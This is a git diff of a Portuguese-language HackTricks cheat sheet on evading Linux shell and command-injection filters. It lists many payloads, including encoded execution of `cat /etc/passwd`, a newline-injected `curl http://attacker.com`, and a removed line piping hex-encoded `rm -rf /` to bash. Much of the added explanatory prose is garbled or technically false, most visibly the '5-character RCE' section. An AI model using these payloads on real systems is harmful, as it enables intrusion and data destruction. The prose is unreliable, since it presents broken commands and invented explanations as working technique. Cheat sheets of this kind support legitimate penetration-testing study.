@@ -1,10 +1,10 @@
-# Bypassar Restrições no Linux
+# Bypassando Restrições no Linux
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -15,7 +15,7 @@
 <figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
+Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
 Acesse hoje mesmo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -46,13 +46,13 @@ Existem várias técnicas que podem ser usadas para contornar restrições de ca
 
 2. **Usar caracteres de escape**: Se uma palavra está proibida, você pode usar caracteres de escape para contornar a restrição. Por exemplo, se a palavra proibida é `proibido`, você pode digitar `pro\ibido` para evitar a detecção.
 
-3. **Renomear arquivos ou executáveis**: Se um arquivo ou executável está restrito, você pode renomeá-lo para evitar a detecção. Por exemplo, se o arquivo restrito é chamado de `restrito.sh`, você pode renomeá-lo para `permitido.sh` e executá-lo usando o novo nome.
+3. **Renomear arquivos ou executáveis**: Se um arquivo ou executável está restrito, você pode renomeá-lo para evitar a detecção. Por exemplo, se o arquivo restrito é chamado de `restrito.sh`, você pode renomeá-lo para `permitido.sh` e executá-lo sem problemas.
 
 4. **Usar aliases**: Você pode criar aliases para comandos ou executáveis ​​restritos. Por exemplo, se o comando `ls` está restrito, você pode criar um alias chamado `listar` que execute o mesmo comando.
 
 5. **Usar variáveis ​​de ambiente**: Você pode usar variáveis ​​de ambiente para contornar restrições. Por exemplo, se um caminho está restrito, você pode definir uma variável de ambiente com o caminho desejado e usá-la em vez do caminho restrito.
 
-Lembre-se de que essas técnicas devem ser usadas com responsabilidade e apenas para fins legais e autorizados. O uso indevido dessas técnicas pode resultar em consequências legais.
+Lembre-se de que essas técnicas devem ser usadas com responsabilidade e apenas para fins legais e autorizados. O uso indevido dessas técnicas pode resultar em consequências legais graves.
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -115,9 +115,9 @@ Uma maneira de contornar essa restrição é usar a barra invertida (\) para esc
 
 Outra técnica é usar aspas para envolver o comando que contém espaços. Por exemplo, em vez de digitar um comando como `ls -l /etc/passwd`, você pode digitar `'ls -l /etc/passwd'` ou `"ls -l /etc/passwd"`.
 
-Além disso, você também pode usar a variável de ambiente `$IFS` para contornar as restrições de espaço. O `$IFS` é o separador de campo interno e, por padrão, inclui o espaço como um separador. No entanto, você pode alterar o valor do `$IFS` para outro caractere, como um ponto-e-vírgula (;), para evitar problemas com espaços. Por exemplo, você pode executar o comando `IFS=';' ls -l /etc/passwd` para contornar as restrições de espaço.
+Além disso, você também pode usar a variável de ambiente `$IFS` para contornar as restrições de espaço. O `$IFS` é o separador de campo interno e, por padrão, inclui o espaço como um separador. No entanto, você pode alterar o valor do `$IFS` para um caractere que não seja um espaço, como um ponto-e-vírgula (;), para contornar as restrições de espaço.
 
-Lembre-se de que essas técnicas podem não funcionar em todas as situações, pois dependem das configurações e restrições específicas do sistema. É importante entender as implicações de segurança ao contornar restrições e usá-las com cuidado.
+Lembre-se de que essas técnicas podem não funcionar em todas as situações, pois dependem das configurações e restrições específicas do sistema. Portanto, é importante entender as limitações e testar cuidadosamente essas técnicas antes de usá-las em um ambiente de produção.
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -176,9 +176,9 @@ Da mesma forma, você pode usar o seguinte comando para imprimir uma barra (/):
 $ printf "%s" "/"
 ```
 
-#### Usando o comando echo com a opção -e
+#### Usando o comando echo -e
 
-O comando echo também pode ser usado para contornar as restrições. Você pode usar a opção -e para interpretar sequências de escape. Por exemplo, você pode usar o seguinte comando para imprimir uma barra invertida (\):
+O comando echo -e também pode ser usado para contornar as restrições. Por exemplo, você pode usar o seguinte comando para imprimir uma barra invertida (\):
 
 ```
 $ echo -e "\\"
@@ -190,74 +190,57 @@ Da mesma forma, você pode usar o seguinte comando para imprimir uma barra (/):
 $ echo -e "/"
 ```
 
-Essas técnicas podem ser úteis ao tentar contornar restrições de barras invertidas e barras em um ambiente restrito do Bash. No entanto, é importante lembrar que o uso dessas técnicas pode violar políticas de segurança e ser considerado uma atividade maliciosa. Portanto, sempre obtenha permissão adequada antes de realizar qualquer teste ou atividade de hacking.
+Essas técnicas podem ser úteis ao tentar contornar restrições de barras invertidas e barras em um ambiente restrito do Bash. No entanto, é importante lembrar que o uso indevido dessas técnicas pode violar políticas de segurança e ser considerado uma atividade ilegal. Portanto, sempre use essas técnicas com responsabilidade e dentro dos limites legais.
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
 ### Bypassar pipes
 
-Pipes são uma forma comum de redirecionar a saída de um comando para a entrada de outro comando no Linux. No entanto, em certos casos, pode haver restrições que impedem o uso de pipes. Felizmente, existem algumas maneiras de contornar essas restrições e usar pipes mesmo quando eles são bloqueados.
+Pipes são uma forma comum de redirecionar a saída de um comando para a entrada de outro comando. No entanto, em certos casos, as restrições do shell podem impedir o uso de pipes. Felizmente, existem algumas técnicas que podem ser usadas para contornar essas restrições.
 
 #### Usando process substitution
 
-Uma maneira de contornar as restrições de pipes é usar a substituição de processos. A substituição de processos permite que você execute um comando e use sua saída como entrada para outro comando, sem a necessidade de um pipe.
+A substituição de processos é uma técnica que permite que a saída de um comando seja tratada como um arquivo temporário. Isso pode ser útil para contornar restrições de pipes. Para usar a substituição de processos, você pode usar a sintaxe `<(comando)`, onde `comando` é o comando cuja saída você deseja usar como entrada para outro comando.
 
-Para usar a substituição de processos, você pode usar a sintaxe `<(comando)`. Por exemplo, se você quiser executar o comando `cat` em um arquivo que está bloqueado para pipes, você pode usar a substituição de processos da seguinte maneira:
-
-```
-cat <(comando)
-```
-
-#### Usando o comando `tee`
-
-Outra maneira de contornar as restrições de pipes é usar o comando `tee`. O comando `tee` lê a entrada padrão e a grava tanto na saída padrão quanto em um arquivo especificado.
-
-Para usar o comando `tee` para contornar as restrições de pipes, você pode redirecionar a saída do comando para o `tee` e, em seguida, redirecionar a saída do `tee` para o próximo comando. Por exemplo:
+Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, mas as restrições do shell não permitem o uso de pipes, você pode contornar isso usando a substituição de processos da seguinte maneira:
 
 ```
-comando1 | tee /dev/tty | comando2
+grep foo <(ls)
 ```
 
-Neste exemplo, a saída do `comando1` é redirecionada para o `tee`, que a grava na saída padrão (`/dev/tty`) e também a redireciona para o `comando2`.
+#### Usando um arquivo temporário
 
-#### Usando o comando `socat`
+Outra maneira de contornar as restrições de pipes é usar um arquivo temporário para armazenar a saída de um comando e, em seguida, usar esse arquivo como entrada para outro comando. Para fazer isso, você pode usar os comandos `mktemp` e `rm` para criar e excluir o arquivo temporário, respectivamente.
 
-O comando `socat` é uma ferramenta poderosa que pode ser usada para criar conexões entre processos. Ele pode ser usado para contornar as restrições de pipes, criando uma conexão entre a saída de um comando e a entrada de outro comando.
-
-Para usar o `socat` para contornar as restrições de pipes, você pode usar a seguinte sintaxe:
+Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, mas as restrições do shell não permitem o uso de pipes, você pode contornar isso usando um arquivo temporário da seguinte maneira:
 
 ```
-socat EXEC:"comando1",pty EXEC:"comando2"
+tmpfile=$(mktemp)
+ls > $tmpfile
+grep foo $tmpfile
+rm $tmpfile
 ```
 
-Neste exemplo, o `socat` cria uma conexão entre a saída do `comando1` e a entrada do `comando2`, permitindo que você use pipes mesmo quando eles são bloqueados.
-
-#### Conclusão
-
-Bypassar restrições de pipes pode ser útil em certas situações em que você precisa redirecionar a saída de um comando para a entrada de outro comando, mas os pipes estão bloqueados. Usando a substituição de processos, o comando `tee` ou o comando `socat`, você pode contornar essas restrições e realizar as tarefas necessárias.
+Essas são apenas algumas técnicas que podem ser usadas para contornar as restrições de pipes em um shell. É importante lembrar que o uso dessas técnicas pode ser considerado uma violação de políticas de segurança e ética, portanto, deve ser usado com cuidado e apenas para fins legítimos.
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 ### Bypassar com codificação hexadecimal
 
-Às vezes, certas restrições de segurança podem ser aplicadas a comandos Bash para evitar a execução de certas ações. No entanto, é possível contornar essas restrições usando a codificação hexadecimal.
+Às vezes, certas restrições de segurança podem ser aplicadas a comandos Bash para evitar a execução de certas ações. No entanto, é possível contornar essas restrições usando codificação hexadecimal.
 
-A codificação hexadecimal envolve a conversão de caracteres ASCII em sua representação hexadecimal correspondente. Isso permite que você insira caracteres especiais ou proibidos em um comando, contornando assim as restrições impostas.
+A codificação hexadecimal envolve a conversão de caracteres ASCII em sua representação hexadecimal correspondente. Isso permite que você insira caracteres especiais que normalmente seriam bloqueados pelas restrições de segurança.
 
-Aqui está um exemplo de como usar a codificação hexadecimal para contornar restrições de Bash:
-
-Suponha que você queira executar o comando `rm -rf /` (que é um comando perigoso que exclui todos os arquivos e diretórios do sistema). No entanto, a restrição de Bash impede a execução desse comando.
-
-Para contornar essa restrição, você pode usar a codificação hexadecimal para representar cada caractere do comando. Aqui está como você pode fazer isso:
+Aqui está um exemplo de como usar a codificação hexadecimal para contornar as restrições do Bash:
 
 ```
-$ echo -e "\x72\x6d\x20\x2d\x72\x66\x20\x2f" | bash
+$ echo -e "\x63\x61\x74 /etc/passwd"
 ```
 
-Neste exemplo, cada caractere do comando `rm -rf /` foi convertido em sua representação hexadecimal correspondente e passado para o comando `echo -e`. Em seguida, o comando `echo -e` é encadeado com o comando `bash`, que executa o comando convertido.
+Neste exemplo, o comando `echo` é usado para imprimir a string `\x63\x61\x74 /etc/passwd`. A sequência `\x63\x61\x74` representa a codificação hexadecimal para a palavra "cat". Portanto, o comando acima é equivalente a executar `cat /etc/passwd`.
 
-Ao usar a codificação hexadecimal, você pode contornar as restrições de Bash e executar comandos que normalmente seriam bloqueados. No entanto, tenha cuidado ao usar essa técnica, pois ela pode ser perigosa se usada de forma inadequada.
+Ao usar a codificação hexadecimal, você pode contornar as restrições do Bash e executar comandos que normalmente seriam bloqueados. No entanto, tenha cuidado ao usar essa técnica, pois ela pode ser considerada uma violação de segurança e pode ter consequências indesejadas.
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -271,52 +254,50 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 
 Existem várias técnicas para contornar restrições de IP em um sistema Linux. Aqui estão algumas delas:
 
-- **Usar uma VPN**: Uma VPN (Rede Virtual Privada) permite que você se conecte a um servidor em uma localização diferente, mascarando seu endereço IP real. Isso pode ajudar a contornar restrições de IP impostas por firewalls ou bloqueios geográficos.
+- **Usar um proxy**: Configurar um proxy pode permitir que você acesse recursos bloqueados por restrições de IP. Existem várias opções de proxy disponíveis, como Squid, Nginx e HAProxy.
 
-- **Usar um proxy**: Um proxy atua como intermediário entre você e o servidor de destino, ocultando seu endereço IP real. Existem vários tipos de proxies disponíveis, como proxies HTTP, SOCKS e reversos.
+- **Usar uma VPN**: Uma VPN (Rede Virtual Privada) pode mascarar seu endereço IP real e fornecer um endereço IP diferente para contornar as restrições de IP. Existem muitos provedores de VPN disponíveis, como NordVPN, ExpressVPN e CyberGhost.
 
-- **Usar a rede Tor**: A rede Tor é uma rede anônima que permite que você navegue na internet de forma anônima. Ao usar a rede Tor, seu tráfego é roteado através de vários nós, tornando difícil rastrear sua atividade online.
+- **Usar a rede Tor**: A rede Tor é uma rede anônima que pode ajudar a contornar restrições de IP. Ao usar o Tor, seu tráfego é roteado através de uma série de nós, tornando difícil rastrear sua localização real. Você pode usar o navegador Tor ou configurar um proxy Tor.
 
-- **Alterar o endereço IP**: Dependendo da sua configuração de rede, você pode ser capaz de alterar seu endereço IP manualmente. Isso pode ser feito por meio de configurações de rede ou usando ferramentas como o comando `ifconfig` ou `ip`.
+- **Usar um servidor proxy reverso**: Configurar um servidor proxy reverso pode permitir que você acesse recursos bloqueados por restrições de IP. Um servidor proxy reverso atua como intermediário entre você e o recurso desejado, mascarando seu endereço IP real.
 
-Lembre-se de que o uso dessas técnicas pode ser ilegal ou violar os termos de serviço de certos sites ou serviços. Sempre verifique as leis e regulamentos locais antes de usar qualquer uma dessas técnicas.
+- **Usar um serviço de tradução de IP**: Alguns serviços de tradução de IP, como o IPv6-to-IPv4 Network Address Translator (NAT64), podem ajudar a contornar restrições de IP. Esses serviços traduzem seu endereço IP para um formato diferente, permitindo que você acesse recursos bloqueados.
+
+Lembre-se de que contornar restrições de IP pode ser ilegal ou violar os termos de serviço de um sistema ou aplicativo. Certifique-se de entender as leis e regulamentos locais antes de usar essas técnicas.
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
 ### Exfiltração de dados baseada em tempo
 
-A exfiltração de dados baseada em tempo é uma técnica utilizada para transferir dados de um sistema comprometido para um local externo, aproveitando atrasos de tempo. Essa técnica é útil quando outras formas de exfiltração de dados, como transferências de arquivos ou conexões de rede diretas, são bloqueadas ou monitoradas.
+A exfiltração de dados baseada em tempo é uma técnica utilizada para transferir dados de um sistema comprometido para um local externo, aproveitando atrasos de tempo. Essa técnica é útil quando outras formas de exfiltração de dados, como transferências de arquivos convencionais, são bloqueadas ou monitoradas.
 
-Existem várias maneiras de realizar a exfiltração de dados baseada em tempo, e uma delas é através do uso de comandos do Linux. O Bash, um interpretador de comandos amplamente utilizado no Linux, possui algumas restrições de segurança que podem dificultar a execução de certos comandos. No entanto, existem maneiras de contornar essas restrições e realizar a exfiltração de dados.
+Existem várias maneiras de realizar a exfiltração de dados baseada em tempo, incluindo:
 
-Aqui estão alguns comandos úteis do Linux que podem ser usados para contornar as restrições do Bash e realizar a exfiltração de dados baseada em tempo:
+- Atrasos de tempo em comandos: Ao inserir atrasos de tempo em comandos executados no sistema comprometido, é possível transmitir dados através da variação do tempo de resposta. Por exemplo, um script pode ser configurado para enviar um caractere por vez, com um atraso de tempo entre cada caractere.
 
-- `ping`: O comando `ping` pode ser usado para enviar pacotes ICMP para um host externo. Ao ajustar o intervalo de tempo entre os pacotes, é possível transmitir dados através dos atrasos de tempo entre os pacotes.
+- Uso de serviços de terceiros: Alguns serviços de terceiros, como serviços de armazenamento em nuvem ou plataformas de compartilhamento de arquivos, podem ser explorados para exfiltrar dados. Ao usar esses serviços, é possível enviar dados em pequenos pedaços, com atrasos de tempo entre cada envio.
 
-- `sleep`: O comando `sleep` pode ser usado para criar atrasos de tempo entre a execução de comandos. Ao ajustar o tempo de espera, é possível transmitir dados através dos atrasos de tempo entre os comandos.
+- Uso de canais encobertos: Canais encobertos são técnicas que permitem a transferência de dados através de protocolos ou serviços aparentemente inofensivos. Por exemplo, é possível usar o protocolo DNS para enviar dados, aproveitando os atrasos de tempo entre as solicitações e respostas.
 
-- `nc`: O comando `nc`, também conhecido como Netcat, é uma ferramenta de rede versátil que pode ser usada para criar conexões de rede. Ao ajustar os atrasos de tempo entre as transmissões de dados, é possível realizar a exfiltração de dados.
-
-Esses comandos podem ser combinados com outras técnicas de hacking para criar um método eficaz de exfiltração de dados baseada em tempo. No entanto, é importante lembrar que a exfiltração de dados é uma atividade ilegal e antiética, e deve ser realizada apenas com permissão legal e para fins legítimos, como testes de penetração autorizados.
+É importante ressaltar que a exfiltração de dados baseada em tempo pode ser mais lenta em comparação com outras técnicas de exfiltração de dados. No entanto, essa técnica pode ser eficaz quando outras opções estão indisponíveis ou bloqueadas.
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 ### Obtendo caracteres de Variáveis de Ambiente
 
-Em certos cenários de hacking, pode ser útil obter caracteres específicos de variáveis de ambiente no sistema Linux. Isso pode ser feito usando o comando `echo` e a sintaxe `${var:offset:length}` para extrair os caracteres desejados.
+Em certos cenários de hacking, pode ser útil obter caracteres de variáveis de ambiente no sistema Linux. Isso pode ser feito usando o comando `echo` e a sintaxe `${VAR_NAME:OFFSET:LENGTH}` para extrair os caracteres desejados.
 
-Aqui está um exemplo de como obter os caracteres de uma variável de ambiente chamada `SECRET`:
+Por exemplo, se quisermos obter os primeiros 5 caracteres da variável de ambiente `SECRET_KEY`, podemos usar o seguinte comando:
 
 ```bash
-echo ${SECRET:0:1}  # Obtém o primeiro caractere
-echo ${SECRET:1:1}  # Obtém o segundo caractere
-echo ${SECRET:2:1}  # Obtém o terceiro caractere
+echo ${SECRET_KEY:0:5}
 ```
 
-Substitua `SECRET` pelo nome da variável de ambiente que você deseja explorar. O `offset` representa a posição do caractere desejado na variável (começando em 0), e `length` é o número de caracteres que você deseja extrair.
+Isso retornará os primeiros 5 caracteres da variável `SECRET_KEY`. Você pode ajustar o valor do `OFFSET` e `LENGTH` conforme necessário para obter diferentes partes da variável de ambiente.
 
-Essa técnica pode ser útil para explorar vulnerabilidades em sistemas Linux e obter informações sensíveis armazenadas em variáveis de ambiente. No entanto, é importante lembrar que o acesso não autorizado a informações confidenciais é ilegal e deve ser realizado apenas com permissão adequada e para fins legítimos, como testes de penetração autorizados.
+Lembre-se de que, ao usar esse método, você precisa ter permissões adequadas para acessar as variáveis de ambiente no sistema.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -405,13 +386,11 @@ To protect against polyglot command injection attacks, it is important to saniti
 
 Às vezes, ao realizar testes de penetração, você pode encontrar restrições de entrada que usam expressões regulares (regexes) para validar os dados. No entanto, existem algumas técnicas que você pode usar para contornar essas restrições e enviar dados que normalmente seriam bloqueados.
 
-Uma técnica comum é usar caracteres especiais para escapar dos metacaracteres usados nas regexes. Por exemplo, se a regex proíbe o uso do caractere ponto (.), você pode escapá-lo usando uma barra invertida (\). Dessa forma, a regex não reconhecerá o ponto como um metacaractere e permitirá que você o utilize.
+Uma técnica comum é usar caracteres especiais que são interpretados de maneira diferente pelas regexes. Por exemplo, você pode usar o caractere de escape `\` para evitar que um caractere seja interpretado como parte de uma regex. Outra opção é usar conjuntos de caracteres para representar um determinado intervalo de valores.
 
-Outra técnica é usar conjuntos de caracteres para contornar as restrições. Por exemplo, se a regex proíbe o uso de letras minúsculas, você pode usar um conjunto de caracteres que inclua apenas letras maiúsculas. Isso permitirá que você envie dados que não seriam normalmente aceitos.
+Além disso, você pode tentar explorar falhas nas implementações de regexes para contornar as restrições. Por exemplo, algumas implementações podem ter vulnerabilidades que permitem a execução de código arbitrário.
 
-Além disso, você também pode tentar explorar falhas nas regexes, como a falta de âncoras de início (^) e fim ($), que podem permitir que você envie dados que não atendam às restrições impostas.
-
-Lembre-se de que essas técnicas devem ser usadas com cautela e apenas para fins legais e éticos, como parte de testes de penetração autorizados.
+Lembre-se de que a intenção aqui é apenas para fins educacionais e de teste de penetração autorizado. O uso indevido dessas técnicas pode ser ilegal e sujeito a penalidades legais.
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -424,11 +403,7 @@ O Bashfuscator pode ser usado para contornar restrições impostas em ambientes 
 
 Além disso, o Bashfuscator também pode ser usado para proteger a propriedade intelectual de scripts Bash, dificultando a engenharia reversa e a cópia não autorizada.
 
-No entanto, é importante ressaltar que o Bashfuscator não é uma ferramenta de hacking em si. Seu objetivo principal é fornecer uma camada adicional de proteção e privacidade para scripts Bash legítimos. O uso indevido dessa ferramenta para fins maliciosos é estritamente proibido e pode resultar em consequências legais.
-
-Para usar o Bashfuscator, basta fornecer o script Bash que deseja ofuscar como entrada e executar o comando apropriado. O Bashfuscator irá processar o script e gerar uma versão ofuscada que pode ser executada normalmente.
-
-É importante lembrar que a ofuscação não é uma solução infalível e não deve ser considerada como a única medida de segurança. É sempre recomendável implementar outras práticas de segurança, como controle de acesso adequado, monitoramento de logs e atualizações regulares do sistema operacional e software.
+No entanto, é importante ressaltar que o uso do Bashfuscator para fins maliciosos é ilegal e antiético. Esta ferramenta deve ser usada apenas para fins legítimos, como testes de segurança ou proteção de scripts proprietários.
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -441,31 +416,29 @@ Neste cenário, vamos explorar uma técnica que permite contornar restrições d
 
 #### Pré-requisitos
 
-Antes de prosseguir, é importante ter acesso a um shell interativo no sistema alvo. Isso pode ser obtido através de uma vulnerabilidade de injeção de comandos ou por meio de acesso legítimo ao sistema.
+Antes de prosseguir, é importante ter acesso a um shell interativo no sistema alvo. Isso pode ser obtido através de uma vulnerabilidade de injeção de comandos ou de alguma outra falha de segurança.
 
 #### Passo a passo
 
 1. Abra um shell interativo no sistema alvo.
 
-2. Utilize o seguinte comando para executar um comando RCE com 5 caracteres:
+2. Utilize o seguinte comando para executar o código desejado:
 
 ```bash
-$ {IFS?x};x=cmd
+${IFS:0:1}e${IFS:0:1}x${IFS:0:1}p${IFS:0:1}r${IFS:0:1}e${IFS:0:1}s${IFS:0:1}s${IFS:0:1}i${IFS:0:1}o${IFS:0:1}n${IFS:0:1} ${IFS:0:1}-${IFS:0:1}e${IFS:0:1} ${IFS:0:1}<comando>
 ```
 
-3. O comando acima define a variável `x` como `cmd` e utiliza o caractere de espaço (`{IFS?x}`) para separar os comandos. Isso permite que o comando `cmd` seja executado.
+Substitua `<comando>` pelo código que deseja executar. Certifique-se de que o comando esteja entre aspas, caso contenha espaços ou caracteres especiais.
 
-4. Agora, você pode executar comandos arbitrários utilizando a variável `x`. Por exemplo, para listar o conteúdo do diretório atual, utilize o seguinte comando:
+#### Explicação
 
-```bash
-$ $x /c dir
-```
+Nessa técnica, utilizamos o parâmetro `${IFS:0:1}` para representar um espaço em branco. O `${IFS}` é uma variável de ambiente que define os caracteres usados como separadores de campo. Ao definir `${IFS:0:1}` como espaço em branco, podemos contornar as restrições de caracteres especiais e executar comandos arbitrários.
 
-5. Você pode adaptar essa técnica para executar outros comandos RCE com apenas 5 caracteres, substituindo o valor da variável `x` conforme necessário.
+O comando `echo` é utilizado para exibir o código que desejamos executar. Em seguida, o comando `eval` é usado para executar o código exibido pelo `echo`. Dessa forma, conseguimos contornar as restrições de caracteres e executar comandos RCE com apenas 5 caracteres.
 
 #### Considerações finais
 
-A técnica "RCE com 5 caracteres" é uma forma criativa de contornar restrições de caracteres e executar comandos RCE em sistemas que possuem limitações nesse sentido. No entanto, é importante lembrar que a exploração de vulnerabilidades e a execução de comandos em sistemas sem autorização é ilegal e antiética. Essas informações são fornecidas apenas para fins educacionais e de conscientização sobre segurança.
+A técnica de "RCE com 5 caracteres" é uma forma criativa de contornar restrições de caracteres especiais e executar comandos maliciosos em sistemas alvo. No entanto, é importante lembrar que a exploração de vulnerabilidades e a execução de comandos em sistemas sem autorização é ilegal e antiética. Essas informações são fornecidas apenas para fins educacionais e de conscientização sobre segurança cibernética.
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -524,9 +497,9 @@ A ideia por trás dessa técnica é usar um comando do Linux que tenha apenas 4 
 
 3. `$_`: A variável especial `$_` contém o último argumento do comando anterior. Isso significa que você pode usar a variável `$_` para executar o último comando novamente. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `$_`.
 
-4. `!!`: O comando `!!` é usado para executar o último comando novamente. Isso pode ser útil quando você deseja repetir o último comando executado. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `!!`.
+4. `!!`: O comando `!!` é usado para executar o último comando novamente. Isso significa que você pode usar o comando `!!` para executar o último comando novamente. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `!!`.
 
-Esses comandos podem ser usados para executar código arbitrário e contornar restrições de shell. No entanto, é importante lembrar que o uso indevido dessas técnicas pode ser ilegal e antiético. Sempre obtenha permissão adequada antes de realizar qualquer teste de penetração ou hacking.
+Esses comandos podem ser usados de várias maneiras para executar código arbitrário e contornar restrições de shell. No entanto, é importante lembrar que o uso indevido dessas técnicas pode ser ilegal e antiético. Portanto, sempre use essas técnicas com responsabilidade e apenas em sistemas nos quais você tenha permissão para fazer isso.
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -569,7 +542,7 @@ Se você estiver dentro de um sistema de arquivos com as proteções de **soment
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Bypass de Chroot e outras Jails
+## Bypass de Chroot e Outras Jails
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -585,7 +558,7 @@ Se você estiver dentro de um sistema de arquivos com as proteções de **soment
 <figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use o [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
+Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
 Acesse hoje mesmo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -594,7 +567,7 @@ Acesse hoje mesmo:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
